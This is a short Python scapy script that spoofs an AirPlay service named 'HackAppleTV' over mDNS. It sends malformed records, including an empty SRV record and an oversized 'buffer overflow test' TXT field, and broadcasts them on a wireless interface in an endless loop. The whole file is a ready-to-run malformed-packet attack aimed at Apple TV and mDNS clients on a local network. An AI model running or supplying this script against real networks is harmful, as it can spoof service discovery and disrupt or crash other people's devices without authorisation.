from scapy.all import *

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

iface = "wlan1"

txt_records = [
    b"model=AppleTV3,2",
    b"deviceid=aa:bb:cc:dd:ee:ff",
    b"features=0x100029ff",
    b"oversized=" + b"A" * 100  # buffer overflow test
]

dns = DNS(
    id=0,
    qr=0,
    opcode=0,
    qdcount=1,
    ancount=1,
    qd=DNSQR(qname="_airplay._tcp.local", qtype="PTR"),
    an=DNSRR(
        rrname="_airplay._tcp.local",
        type="PTR",
        rclass=0x8001,
        ttl=120,
        rdata="HackAppleTV._airplay._tcp.local"
    )
)

pkt = (
    Ether(dst="ff:ff:ff:ff:ff:ff") /
    IP(dst="224.0.0.251") /
    UDP(sport=5353, dport=5353) /
    dns /
    DNSRR(
        rrname="HackAppleTV._airplay._tcp.local",
        type="SRV",
        ttl=120,
        rclass=1,
        rdlen=0,
        rdata="\x00\x00\x00\x00"
    ) /
    DNSRR(
        rrname="HackAppleTV._airplay._tcp.local",
        type="TXT",
        ttl=120,
        rclass=1,
        rdata=b"\x00".join(txt_records)
    )
)

print(Colors.GREEN + "[*] sending malformed mDNS packets..." + Colors.ENDC)
sendp(pkt, iface=iface, loop=1, inter=2)